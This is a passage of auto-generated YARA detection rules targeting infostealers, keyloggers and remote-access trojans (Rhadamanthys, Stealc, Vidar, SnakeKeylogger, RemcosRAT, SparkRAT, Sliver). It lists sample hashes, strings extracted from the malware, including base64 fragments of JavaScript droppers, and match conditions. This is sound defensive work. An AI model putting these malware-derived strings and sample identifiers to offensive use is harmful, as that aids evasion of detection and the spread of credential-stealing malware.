      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32687360.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32cfff30.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_516d9dae.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_552543de.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_5840ea1c.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b4fd170f.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b7b7d002.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_c3f26585.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_dd620aed.exe, Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Sliver(signature)_c2d457ad8ac36fc9f18d45bffcd450c2(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d75aad03.exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash)_837a5ae1.exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "7dcf3101452546647c0a3b55519db6ba479c7169067e35d8db41b8ff45028247"
      hash3 = "03fe53eff294a718d3a887e23e2e83c98c55e8b6b5654bbc6650400f011604ad"
      hash4 = "32687360fdc4dad7137f1937bd995ca4591cb65f8ca607fa48d1a394cc4a824b"
      hash5 = "32cfff30d6ed1f3395b8ffbc8319fad8723f71547364a6cde2faddb2b80b5b1d"
      hash6 = "516d9daee48799c22090e64835e99df3d6a6384e9305bfa90287486c4e9881be"
      hash7 = "552543dea61279d3a283976db9ef74cb33d9ab66aba5ac3bb6203ffbcf141206"
      hash8 = "5840ea1c615a9daee7648736117ddce1c7c6e2143bf3b971e6828989e094edc4"
      hash9 = "b4fd170f2d56421678f4743cba758fb69779b4bfd0f77202dbfc760d8ed1c8e5"
      hash10 = "b7b7d00276073da29572e3dee367869d603ec7f64080a8bf99a8226ece840375"
      hash11 = "c3f26585fd9cf218077198e642eabb9a8468f092d8a9138b43e7f68c832df64a"
      hash12 = "dd620aedd68431d93bf160121019e21774e7e4955f7be863486c5a699b1187c7"
      hash13 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
      hash14 = "d15e35dcb836d038d70b217709261b6a29c1d871c16304368b18ece21b989878"
      hash15 = "ed370fcbafa43b4b578d5722e922e706dd854189e5a5b9ca17213c307b3f9a23"
      hash16 = "d75aad0391ff8c63fba6f7315e520f5ea61229591277b09240e48e185e435eea"
      hash17 = "31294603a887756a97d1f8b3b5f8a0f3ece03907448ea717dfc8b4d017be5897"
      hash18 = "837a5ae11a55ee51f20f6e1377a714730fe4df1914d22529064a70008393dca8"
      hash19 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "sync.runtime_SemacquireMutex" fullword ascii /* score: '21.00'*/
      $s2 = "runtime.getLoadLibraryEx" fullword ascii /* score: '15.00'*/
      $s3 = "runtime.getLoadLibrary" fullword ascii /* score: '15.00'*/
      $s4 = "runtime.getGetProcAddress" fullword ascii /* score: '14.00'*/
      $s5 = "runtime.handlecompletion" fullword ascii /* score: '13.00'*/
      $s6 = "runtime.hashGrow" fullword ascii /* score: '13.00'*/
      $s7 = "runtime.tophash" fullword ascii /* score: '13.00'*/
      $s8 = "tophash" fullword ascii /* score: '11.00'*/
      $s9 = "runtime.tracefree" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.bucketShift" fullword ascii /* score: '10.00'*/
      $s11 = "sync.runtime_nanotime" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.overLoadFactor" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.(*bmap).keys" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.growWork_fast32" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.evacuate_fast32" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__d5834be2544a02797750dc7759c325d4_imphash__SnakeKeylogger_signature__e1286f2989f2b70b354fe5e33036a7b_103 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_d5834be2544a02797750dc7759c325d4(imphash).exe, SnakeKeylogger(signature)_e1286f2989f2b70b354fe5e33036a7bb(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a18e90d3f747ff22bdd705536ec38718b3611ae4ecd74fee73509faf5b708ec7"
      hash2 = "e1eb24ee7b92716ab4ca09309e4dc4ce5470f832145d00f18a2eda2dcd595384"
   strings:
      $s1 = "Thread.AbandonedMutexException" fullword ascii /* score: '21.00'*/
      $s2 = "2RefreshCurrentProcessorId2ProcessorNumberSpeedCheck*UninlinedThreadStatic8CreateThreadLocalCountObject$get_SafeWaitHandle@" fullword ascii /* score: '16.00'*/
      $s3 = " TerminateProcess" fullword ascii /* score: '15.00'*/
      $s4 = "ExecutionEngineException previously indicated an unspecified fatal error in the runtime. The runtime no longer raises this excep" ascii /* score: '15.00'*/
      $s5 = "ModuleFixupCell&SECURITY_ATTRIBUTES PROCESSOR_NUMBER" fullword ascii /* score: '15.00'*/
      $s6 = "*System.ComponentModel" fullword ascii /* score: '14.00'*/
      $s7 = "get_Current$GetCurrentThreadId" fullword ascii /* score: '12.00'*/
      $s8 = "GetNativeOffset6InitializeForIpAddressArray@" fullword ascii /* score: '12.00'*/
      $s9 = "<GetInlinedThreadStaticBaseSlowFGetUninlinedThreadStaticBaseForType" fullword ascii /* score: '12.00'*/
      $s10 = "2<get_ComputerName>b__10_0@" fullword ascii /* score: '12.00'*/
      $s11 = "IKeyedItem`1" fullword ascii /* score: '12.00'*/
      $s12 = "4NullableEqualityComparer`10ObjectEqualityComparer`1>IInternalStringEqualityComparer(KeyNotFoundException" fullword ascii /* score: '10.00'*/
      $s13 = "StorePermission0StorePermissionAttribute(StorePermissionFlags0TypeDescriptorPermissionBTypeDescriptorPermissionAttribute:TypeDes" ascii /* score: '10.00'*/
      $s14 = "$get_CurrentCulture(get_InvariantCulture" fullword ascii /* score: '9.00'*/
      $s15 = "*GetArrayDataReference=" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 12000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphas_104 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_9f5e1c5e.exe, RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_aa1badc8.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0003037c.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_8317cc0a.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_898fa5e7.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a44128af.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c043bb7c.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ff0c0b76.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cc1b38c4aa79c03c777b0d99c9ae67fef380572e36f0744d110c18137ce9f3dd"
      hash2 = "9f5e1c5ea05a6275d90bac217e0fd8061c7e87e174b69bcdd26625e873c7579b"
      hash3 = "aa1badc8a65a7e941f3e9e9ed3e7ab9ff565900904e57bcd8e5428c6b900d522"
      hash4 = "0003037c7818733557d04c87095ece05f43dce9f2b571d82ba633181956132a2"
      hash5 = "8317cc0a4d4b4c3776f6f572da2635063a6244f1d9846c8fa8754ab085c555c5"
      hash6 = "898fa5e7ec65acee299dca750e5369836bd3453aad9e7d5fe5e6061ee24e35d3"
      hash7 = "a44128afda43c52008225dda2f60357b13030df3f639e42cd83c3e35e0e8c09a"
      hash8 = "c043bb7c8433a8430e1856c399feaea58789b16961d4127d0aa2e72103cd3bbf"
      hash9 = "ff0c0b76e51dde557fbd22c925ee73d871159b84295843237fab8daae91afa85"
   strings:
      $s1 = "UpdateLastLogin" fullword ascii /* score: '15.00'*/
      $s2 = "<LastLoginDate>k__BackingField" fullword ascii /* score: '15.00'*/
      $s3 = "get_EstimatedHours" fullword ascii /* score: '9.00'*/
      $s4 = "get_Assignment" fullword ascii /* score: '9.00'*/
      $s5 = "GetUrgencyLevel" fullword ascii /* score: '9.00'*/
      $s6 = "get_SubjectGrades" fullword ascii /* score: '9.00'*/
      $s7 = "GetSubjectsNeedingImprovement" fullword ascii /* score: '9.00'*/
      $s8 = "GetGradeForSubject" fullword ascii /* score: '9.00'*/
      $s9 = "GetDaysUntilDue" fullword ascii /* score: '9.00'*/
      $s10 = "get_StudyHoursPerWeek" fullword ascii /* score: '9.00'*/
      $s11 = "get_StudentId" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__5a23efc3_RemcosRAT_signature__7f46e341_RemcosRAT_signature__a8741f2d_105 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_5a23efc3.js, RemcosRAT(signature)_7f46e341.js, RemcosRAT(signature)_a8741f2d.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5a23efc306dd589c16d9781de2b9d26eeeddccfca23310247912edc3323fa979"
      hash2 = "7f46e341e906e3c3b4b9ce3748f426f27fd808d904a1fe2a0706c690e0613132"
      hash3 = "a8741f2d62f81c47812fd549d14aea8d5872afb9b9788d69c6f14d5bf6fc74ac"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '26.50'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAC" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s3 = "AEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAE" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s6 = "ZXhwZWN0ZWQgc21hbGwgYmxvY2sgbGVha3MgYXJlOg0KACBieXRlczogAAAAAFVua25vd24AU3RyaW5nAABUaGUgc2l6ZXMgb2YgdW5leHBlY3RlZCBsZWFrZWQgbWVk" ascii /* score: '16.00'*/
      $s7 = "CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD" ascii /* base64 encoded string  */ /* score: '14.50'*/
      $s8 = "ACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '12.50'*/
      $s9 = "dGlvbiCpIDIwMDQsIDIwMDUgUGllcnJlIGxlIFJpY2hlIC8gUHJvZmVzc2lvbmFsIFNvZnR3YXJlIERldmVsb3BtZW50APAPsBHDjUAAiwiJCotIBItACIlKBIlCCMON" ascii /* score: '11.00'*/
      $s10 = "ehjfehDfegjfOsONQADfKN9oCN9oEN9oGN9oIItIKIlKKN96IN96GN96EN96CN86w5DfKN9oCN9oEN9oGN9oIN9oKItIMIlKMN96KN96IN96GN96EN96CN86w41AAN8o" ascii /* score: '11.00'*/
      $s11 = "B40Eko0UkoP5AYPf/8HoFoHi//8/AAnBg8gwiAeNBJKNFJKD+QGD3//B6BWB4v//HwAJwYPIMIgHjQSSg/kBg9//wegUg8gwiAeNRwFfw41AAFNWi/GL2ovTi87oEQwA" ascii /* score: '11.00'*/
      $s12 = "AHQLVYvD6Cv+//9Z60OBvfhH/v8AEAAAfTeD5vCD7gSJtexH/v+Lw+ix/f//hMB1IMaF/0f+/wCLhfhH/v+LlexH/v+JlIXYB/7//4X4R/7/i8PoHvr//4vYhdt1jot/" ascii /* score: '11.00'*/
      $s13 = "/4vYT4PuCIP//w+F6f7//4uF5Ef+/4mF6Ef+/4GF2Ef+/wAIAACDhdxH/v8g/43wR/7/D4Wa/v//g734R/7/AH56gL33R/7/AHQQxgMNQ8YDCkPGAw1DxgMKQ7jYKUAA" ascii /* score: '11.00'*/
      $s14 = "3zrDjUAAg+kMAcgByvfZeRPfLAHfbAEI33wRCN88EYPBEHjt3ywB3zwRi0QBCIlEEQjDjUAAg+kEAcgByvfZ3ywB3zwRg8EIePWLBAGJBBHDkItIBIsQOdGJEYlKBHQC" ascii /* score: '11.00'*/
      $s15 = "uTwAAACL0+iG+f//i9iLvfhH/v9Phf9yQ0fHheBH/v8AAAAAjbXYB/7/g73gR/7/AHQIxgMsQ8YDIEOLBovT6DL4//+L2I2F1//9/zvYdwz/heBH/v+DxgRPdc64GCpA" ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x6176 and filesize < 7000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__c7269d59926fa4252270f407e4dab043__106 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Sliver(signature)_c2d457ad8ac36fc9f18d45bffcd450c2(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash)_837a5ae1.exe, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
      hash3 = "d15e35dcb836d038d70b217709261b6a29c1d871c16304368b18ece21b989878"
      hash4 = "31294603a887756a97d1f8b3b5f8a0f3ece03907448ea717dfc8b4d017be5897"
      hash5 = "837a5ae11a55ee51f20f6e1377a714730fe4df1914d22529064a70008393dca8"
      hash6 = "faed38b89c09070971844291bfefe437592451789e389ab38e3396ff84e49159"
      hash7 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "runtime.levelLogPages" fullword ascii /* score: '15.00'*/
      $s2 = "runtime.sysDirectory" fullword ascii /* score: '14.00'*/
      $s3 = "runtime.sysDirectoryLen" fullword ascii /* score: '14.00'*/
      $s4 = "runtime.cbs" fullword ascii /* score: '13.00'*/
      $s5 = "runtime.shiftError" fullword ascii /* score: '13.00'*/
      $s6 = "runtime.boundsNegErrorFmts" fullword ascii /* score: '13.00'*/
      $s7 = "runtime.boundsErrorFmts" fullword ascii /* score: '13.00'*/
      $s8 = "runtime.inittrace" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.gcMarkDoneFlushed" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.gcsema" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.suspendLock" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.gcBgMarkWorkerCount" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.levelShift" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.levelBits" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.physHugePageShift" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__7bfcbc53d4c02bdedbc3a63219e5ed9f_imphash__Rhadamanthys_signature__d5834be2544a02797750dc7759c325d4__107 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_7bfcbc53d4c02bdedbc3a63219e5ed9f(imphash).exe, Rhadamanthys(signature)_d5834be2544a02797750dc7759c325d4(imphash).exe, SnakeKeylogger(signature)_e1286f2989f2b70b354fe5e33036a7bb(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a5e075e870c492583a67a818932e5c48d879db6d343ac6c837306222e444b8d7"
      hash2 = "a18e90d3f747ff22bdd705536ec38718b3611ae4ecd74fee73509faf5b708ec7"
      hash3 = "e1eb24ee7b92716ab4ca09309e4dc4ce5470f832145d00f18a2eda2dcd595384"
   strings:
      $s1 = "TElementFReflectionDomainSetupImplementationDExecutionEnvironmentImplementation[" fullword ascii /* score: '16.00'*/
      $s2 = "RTryGetConstructedGenericTypeForComponentsRTryLookupFunctionPointerTypeForComponents@" fullword ascii /* score: '15.00'*/
      $s3 = "8TryGetByRefTypeForTargetType,GetByRefTypeTargetType" fullword ascii /* score: '14.00'*/
      $s4 = "6get_IsArrayOfReferenceTypes:TryGetGenericMethodComponents" fullword ascii /* score: '12.00'*/
      $s5 = "Nget_InternalRuntimeGenericTypeArguments@" fullword ascii /* score: '12.00'*/
      $s6 = "2FunctionPointersToOffsetstTryGetConstructedGenericTypeForComponentsNoConstraintCheck@" fullword ascii /* score: '12.00'*/
      $s7 = "PGetMethodNameFromStartAddressIfAvailable FormatMethodName" fullword ascii /* score: '12.00'*/
      $s8 = "Set8get_IsVectorizationSupported@" fullword ascii /* score: '12.00'*/
      $s9 = "IsValueTypeImpl<get_InternalRuntimeElementType@" fullword ascii /* score: '12.00'*/
      $s10 = "@get_RuntimeGenericTypeParameters>get_TypeRefDefOrSpecForBaseType@" fullword ascii /* score: '12.00'*/
      $s11 = "`ReflectionExecutionDomainCallbacksImplementation" fullword ascii /* score: '12.00'*/
      $s12 = "$GetRuntimeTypeCode" fullword ascii /* score: '12.00'*/
      $s13 = "$CoGetApartmentType" fullword ascii /* score: '9.00'*/
      $s14 = "Arabic*TransliteratedEnglish(TransliteratedFrench CompareEraRanges" fullword ascii /* score: '9.00'*/
      $s15 = "get_IsGCPointer$get_UnderlyingType0get_HasStaticConstructor" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 12000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c8b88d11d_imphash__32cfff30_Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c_108 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32cfff30.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b7b7d002.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_c3f26585.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "32cfff30d6ed1f3395b8ffbc8319fad8723f71547364a6cde2faddb2b80b5b1d"
      hash2 = "b7b7d00276073da29572e3dee367869d603ec7f64080a8bf99a8226ece840375"
      hash3 = "c3f26585fd9cf218077198e642eabb9a8468f092d8a9138b43e7f68c832df64a"
   strings:
      $s1 = "runtime._GetQueuedCompletionStatusEx" fullword ascii /* score: '15.00'*/
      $s2 = "runtime.support_sse41" fullword ascii /* score: '13.00'*/
      $s3 = "runtime.statictmp_2" fullword ascii /* score: '13.00'*/
      $s4 = "runtime.support_popcnt" fullword ascii /* score: '13.00'*/
      $s5 = "runtime.statictmp_10" fullword ascii /* score: '13.00'*/
      $s6 = "runtime.statictmp_8" fullword ascii /* score: '13.00'*/
      $s7 = "runtime.statictmp_1" fullword ascii /* score: '13.00'*/
      $s8 = "runtime.statictmp_16" fullword ascii /* score: '13.00'*/
      $s9 = "runtime.statictmp_11" fullword ascii /* score: '13.00'*/
      $s10 = "runtime.statictmp_20" fullword ascii /* score: '13.00'*/
      $s11 = "runtime.statictmp_9" fullword ascii /* score: '13.00'*/
      $s12 = "runtime.statictmp_17" fullword ascii /* score: '13.00'*/
      $s13 = "runtime.statictmp_5" fullword ascii /* score: '13.00'*/
      $s14 = "runtime.support_erms" fullword ascii /* score: '13.00'*/
      $s15 = "runtime.support_sse2" fullword ascii /* score: '13.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and pe.imphash() == "a520fd20530cf0b0db6a6c3c8b88d11d" and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__c7269d59926fa4252270f407e4dab043_imphash__Sliver_signature__c2d457ad8ac36fc9f18d45bffcd450c2_imphas_109 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Sliver(signature)_c2d457ad8ac36fc9f18d45bffcd450c2(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d75aad03.exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash)_837a5ae1.exe, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
      hash2 = "d15e35dcb836d038d70b217709261b6a29c1d871c16304368b18ece21b989878"
      hash3 = "ed370fcbafa43b4b578d5722e922e706dd854189e5a5b9ca17213c307b3f9a23"
      hash4 = "d75aad0391ff8c63fba6f7315e520f5ea61229591277b09240e48e185e435eea"
      hash5 = "31294603a887756a97d1f8b3b5f8a0f3ece03907448ea717dfc8b4d017be5897"
      hash6 = "837a5ae11a55ee51f20f6e1377a714730fe4df1914d22529064a70008393dca8"
      hash7 = "faed38b89c09070971844291bfefe437592451789e389ab38e3396ff84e49159"
   strings:
      $s1 = "runtime.(*gcControllerState).commit" fullword ascii /* score: '14.00'*/
      $s2 = "runtime.initLongPathSupport" fullword ascii /* score: '13.00'*/
      $s3 = "runtime.(*sweepLocker).tryAcquire" fullword ascii /* score: '12.00'*/
      $s4 = "runtime.(*sweepLocked).sweep" fullword ascii /* score: '12.00'*/
      $s5 = "runtime.printArgs" fullword ascii /* score: '10.00'*/
      $s6 = "runtime.mstart0" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.printArgs.func2" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.winthrow" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.gcResetMarkState.func1" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.osyield_no_g" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.printArgs.func1" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.forEachG" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.forEachGRace" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.sigpanic0" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.unreachableMethod" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__7bfcbc53d4c02bdedbc3a63219e5ed9f_imphash__Rhadamanthys_signature__acb97f311176c6761732879ff5096c34__110 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_7bfcbc53d4c02bdedbc3a63219e5ed9f(imphash).exe, Rhadamanthys(signature)_acb97f311176c6761732879ff5096c34(imphash).exe, Rhadamanthys(signature)_d5834be2544a02797750dc7759c325d4(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash)_082c1741.exe, SnakeKeylogger(signature)_d9d3dc366861974d56e9cfc24758d032(imphash).exe, SnakeKeylogger(signature)_e1286f2989f2b70b354fe5e33036a7bb(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a5e075e870c492583a67a818932e5c48d879db6d343ac6c837306222e444b8d7"
      hash2 = "cac7b5e6cdd5bf4fdcd9017dd1e23837cfb4b67a9568a70bb6a6525a0f313438"
      hash3 = "a18e90d3f747ff22bdd705536ec38718b3611ae4ecd74fee73509faf5b708ec7"
      hash4 = "cbc7b8123f7ef72341952e2e1acb4b8debdb0e3df2ecfcce92eedf95e208e63d"
      hash5 = "082c17414af12072323ba9f4c1b1ce57491434032ff5f339374866dea3dfcc09"
      hash6 = "2f4b19d08da3f9a16b75ff1211c2aecd6e2b4f372f832b8fc6499cb1ea6384f3"
      hash7 = "e1eb24ee7b92716ab4ca09309e4dc4ce5470f832145d00f18a2eda2dcd595384"
   strings:
      $s1 = "BResolveGenericVirtualMethodTargetBGetStringFromMemoryInNativeFormatDGetRuntimeFieldHandleForComponents@" fullword ascii /* score: '20.00'*/
      $s2 = "RTryGetStaticRuntimeMethodHandleComponentsRGetMethodDescForStaticRuntimeMethodHandle@" fullword ascii /* score: '15.00'*/
      $s3 = "2RuntimeMethodKeyHashtable" fullword ascii /* score: '13.00'*/
      $s4 = "RFunctionPointerRuntimeTypeHandleHashtable,GenericTypeInstanceKey" fullword ascii /* score: '13.00'*/
      $s5 = "NDynamicGenericMethodComponentsHashtableDMethodDescBasedGenericMethodLookup" fullword ascii /* score: '13.00'*/
      $s6 = "tRuntimeTypeHandleToParameterTypeRuntimeTypeHandleHashtable,FunctionPointerTypeKey" fullword ascii /* score: '13.00'*/
      $s7 = "<InstantiatedMethodKeyHashtable" fullword ascii /* score: '10.00'*/
      $s8 = "8DynamicGenericTypesHashtable*GenericTypeLookupData*LazyDictionaryContext" fullword ascii /* score: '10.00'*/
      $s9 = "*RuntimeFieldHandleKey" fullword ascii /* score: '10.00'*/
      $s10 = "JMethodForInstantiatedTypeKeyHashtable" fullword ascii /* score: '10.00'*/
      $s11 = "*ArrayTypeKeyHashtable" fullword ascii /* score: '10.00'*/
      $s12 = ",RuntimeMethodHandleKey" fullword ascii /* score: '10.00'*/
      $s13 = "8InstantiatedTypeKeyHashtable" fullword ascii /* score: '10.00'*/
      $s14 = "<DynamicGenericMethodsHashtable.GenericMethodLookupData" fullword ascii /* score: '10.00'*/
      $s15 = "HFieldForInstantiatedTypeKeyHashtable" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 13000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7d55bce71f04e2295549851ae8e8438c_imphash__RemcosRAT_signature__f8676c0eabd52438a3e9d250ae4ce9d9_imphas_111 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7d55bce71f04e2295549851ae8e8438c(imphash).exe, RemcosRAT(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, Rhadamanthys(signature)_acb97f311176c6761732879ff5096c34(imphash).exe, Rhadamanthys(signature)_d5834be2544a02797750dc7759c325d4(imphash).exe, SnakeKeylogger(signature)_d9d3dc366861974d56e9cfc24758d032(imphash).exe, SnakeKeylogger(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b052c0a60681008a7ebd4b9797badf24129a8710c0ec56fe560c14c61c44f79"
      hash2 = "b1b35d08454aa76254214c2fb611bab5b7de66751c502203ee16690b9c754936"
      hash3 = "cac7b5e6cdd5bf4fdcd9017dd1e23837cfb4b67a9568a70bb6a6525a0f313438"
      hash4 = "a18e90d3f747ff22bdd705536ec38718b3611ae4ecd74fee73509faf5b708ec7"
      hash5 = "2f4b19d08da3f9a16b75ff1211c2aecd6e2b4f372f832b8fc6499cb1ea6384f3"
      hash6 = "25a0cac54fdaeec8e52d8c5689f775fb00c6af4e6c07935ad967fd4a6c09971b"
   strings:
      $s1 = " NtProcessManager" fullword ascii /* score: '15.00'*/
      $s2 = " ExecutionContext(IOCompletionCallback" fullword ascii /* score: '15.00'*/
      $s3 = "Switch.System.Runtime.Serialization.SerializationGuard" fullword wide /* score: '14.00'*/
      $s4 = "BindHandle for ThreadPool failed on this handle" fullword wide /* score: '13.00'*/
      $s5 = "RGetNativeOverlappedStateWindowsThreadPool" fullword ascii /* score: '12.00'*/
      $s6 = "GetDecoder@" fullword ascii /* score: '11.00'*/
